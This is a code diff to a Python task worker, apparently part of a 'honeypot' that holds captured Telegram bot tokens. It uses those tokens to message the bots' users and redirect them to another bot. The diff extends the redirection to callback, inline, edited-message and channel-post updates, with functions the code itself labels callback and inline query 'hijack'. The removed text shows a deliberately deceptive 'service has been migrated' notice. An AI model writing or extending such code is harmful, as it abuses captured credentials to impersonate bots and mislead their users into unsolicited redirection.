@@ -3892,7 +3892,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
             db.table("honeypot_updates")
             .select("id, credential_id, payload, received_at")
             .is_("redirected_at", "null")
-            .eq("update_type", "message")
+            .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
             .order("received_at", desc=False)
             .limit(50)
         )
@@ -3908,11 +3908,39 @@ async def _honeypot_redirect_sweep_logic() -> dict:
 
     for row in rows:
         payload = row.get("payload") or {}
-        msg = payload.get("message") or {}
-        from_user = msg.get("from") or {}
-        user_id = from_user.get("id")
-        chat_id = msg.get("chat", {}).get("id")
         credential_id = row.get("credential_id")
+        update_type = row.get("update_type") or "message"
+        
+        # Extract user_id and chat_id based on update_type
+        user_id = None
+        chat_id = None
+        from_user = {}
+
+        if update_type == "message":
+            msg = payload.get("message") or {}
+            from_user = msg.get("from") or {}
+            user_id = from_user.get("id")
+            chat_id = msg.get("chat", {}).get("id")
+        elif update_type == "callback_query":
+            cb = payload.get("callback_query") or {}
+            from_user = cb.get("from") or {}
+            user_id = from_user.get("id")
+            chat_id = cb.get("message", {}).get("chat", {}).get("id") or user_id
+        elif update_type == "inline_query":
+            iq = payload.get("inline_query") or {}
+            from_user = iq.get("from") or {}
+            user_id = from_user.get("id")
+            chat_id = user_id  # Inline: use user_id
+        elif update_type == "edited_message":
+            msg = payload.get("edited_message") or {}
+            from_user = msg.get("from") or {}
+            user_id = from_user.get("id")
+            chat_id = msg.get("chat", {}).get("id")
+        elif update_type == "channel_post":
+            msg = payload.get("channel_post") or {}
+            from_user = msg.get("from") or {}
+            user_id = from_user.get("id") if not from_user.get("is_bot") else None
+            chat_id = msg.get("chat", {}).get("id")
 
         # Skip bots, missing data
         if not user_id or not chat_id or not credential_id:
@@ -3922,12 +3950,11 @@ async def _honeypot_redirect_sweep_logic() -> dict:
             skipped += 1
             continue
 
-        # Per-user dedup: check if we already sent to this user for this credential
+        # Per-user dedup
         dedup_key = f"redirect:sent:{credential_id}:{user_id}"
         try:
             from app.core.redis_srv import redis_srv
             if redis_srv.client.exists(dedup_key):
-                # Already sent — mark this row as redirected and skip
                 try:
                     await async_execute(
                         db.table("honeypot_updates")
@@ -3941,7 +3968,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         except Exception:
             pass
 
-        # Dispatch the actual redirect
+        # Dispatch redirect with update_type for specialized handling
         app.send_task(
             "flow.honeypot_redirect_one",
             kwargs={
@@ -3949,6 +3976,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
                 "credential_id": credential_id,
                 "user_id": user_id,
                 "chat_id": chat_id,
+                "update_type": update_type,
             },
         )
         dispatched += 1
@@ -3962,12 +3990,13 @@ def honeypot_redirect_one(
     credential_id: str,
     user_id: int,
     chat_id: int,
+    update_type: str = "message",
 ):
     """Send a redirect message to a single user via the captured bot's token."""
     from app.workers.celery_app import get_worker_loop
 
     return get_worker_loop().run_until_complete(
-        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id)
+        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id, update_type)
     )
 
 
@@ -3976,25 +4005,77 @@ async def _honeypot_redirect_one_logic(
     credential_id: str,
     user_id: int,
     chat_id: int,
+    update_type: str = "message",
 ) -> dict:
     import httpx
     from app.core.security import security
     from datetime import datetime, timezone
-
+    from app.workers.tasks.honeypot_redirect_strategies import HoneypotRedirectStrategies
+    
     redirect_bot = settings.HONEYPOT_REDIRECT_BOT
     deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
-
-    # Build the redirect URL
     redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
-
-    # The message — ominous, vague, compelling. Looks like automated bot behavior.
-    text = (
-        "⚠️ This service has been migrated.\n\n"
-        "Your request could not be processed here. "
-        "To continue, use the updated channel:\n\n"
-        f"👉 {redirect_url}\n\n"
-        "This is an automated notification."
-    )
+    
+    # Level 3: Callback query hijack
+    if update_type == "callback_query":
+        payload = await async_execute(
+            db.table("honeypot_updates")
+            .select("payload")
+            .eq("id", update_id)
+            .limit(1)
+        )
+        if not payload.data:
+            return {"status": "payload_not_found"}
+        
+        cb = payload.data[0].get("payload", {}).get("callback_query", {})
+        callback_id = cb.get("id")
+        
+        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
+        if not bot_token:
+            return {"status": "token_decrypt_failed"}
+        
+        sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
+            bot_token, callback_id, redirect_url, redirect_bot
+        )
+        
+        await HoneypotRedirectStrategies.update_redirect_record(
+            update_id, user_id, redirect_bot
+        )
+        HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
+        
+        logger.info(f"🔀 [Callback] hijacked user:{user_id} cred:{credential_id[:8]}...")
+        return {"status": "callback_handled", "user_id": user_id, "sent": sent_ok}
+    
+    # Level 4: Inline query hijack
+    elif update_type == "inline_query":
+        payload = await async_execute(
+            db.table("honeypot_updates")
+            .select("payload")
+            .eq("id", update_id)
+            .limit(1)
+        )
+        if not payload.data:
+            return {"status": "payload_not_found"}
+        
+        iq = payload.data[0].get("payload", {}).get("inline_query", {})
+        inline_id = iq.get("id")
+        query_text = iq.get("query", "")
+        
+        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
+        if not bot_token:
+            return {"status": "token_decrypt_failed"}
+        
+        sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
+            bot_token, inline_id, query_text, redirect_url, redirect_bot
+        )
+        
+        await HoneypotRedirectStrategies.update_redirect_record(
+            update_id, user_id, redirect_bot
+        )
+        HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
+        
+        logger.info(f"🔀 [Inline] hijacked user:{user_id} cred:{credential_id[:8]}...")
+        return {"status": "inline_handled", "user_id": user_id, "sent": sent_ok}
 
     # Get the captured bot's token
     try:
